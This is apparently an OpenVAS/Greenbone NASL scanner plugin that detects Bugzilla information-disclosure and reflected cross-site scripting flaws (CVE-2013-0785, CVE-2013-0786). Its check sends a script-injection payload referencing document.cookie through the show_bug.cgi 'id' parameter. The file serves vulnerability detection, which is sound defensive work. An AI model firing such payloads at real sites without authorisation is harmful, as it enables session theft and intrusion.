# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mozilla:bugzilla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803173");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2013-0785", "CVE-2013-0786");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2013-03-01 10:58:42 +0530 (Fri, 01 Mar 2013)");

  script_name("Bugzilla Information Disclosure and Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52254");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58001");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58060");
  script_xref(name:"URL", value:"http://www.bugzilla.org/security/3.6.12");
  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=842038");
  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=824399");

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_dependencies("bugzilla_detect.nasl");
  script_mandatory_keys("bugzilla/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to gain sensitive
information and execute arbitrary HTML and script code in a users browser session in context of an affected
site.");

  script_tag(name:"affected", value:"Bugzilla version 2.0 to 3.6.12, 3.7.1 to 4.0.9, 4.1.1 to 4.2.4 and 4.3.1 to
4.4rc1");

  script_tag(name:"insight", value:"- Input passed to the 'id' parameter in show_bug.cgi (when 'format' is set
to an invalid format) is not properly sanitized before being returned to the user.

  - An error related to running a query in debug mode can be exploited to disclose if certain field values exists.");

  script_tag(name:"solution", value:"Upgrade to Bugzilla 3.6.13, 4.0.10, 4.2.5, 4.4rc2 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Bugzilla is prone to information disclosure and cross site scripting vulnerabilities.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!bugPort = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:bugPort))
  exit(0);

url = dir + '/show_bug.cgi?id="><script>alert(document.cookie)</script>&format=123';

if (http_vuln_check(port:bugPort, url:url, pattern:"><script>alert/(document.cookie/)</script>",
                    extra_check:"BUGZILLA", check_header:TRUE)) {
  report = http_report_vuln_url( port:bugPort, url:url );
  security_message(port:bugPort, data:report);
  exit(0);
}

exit(0);
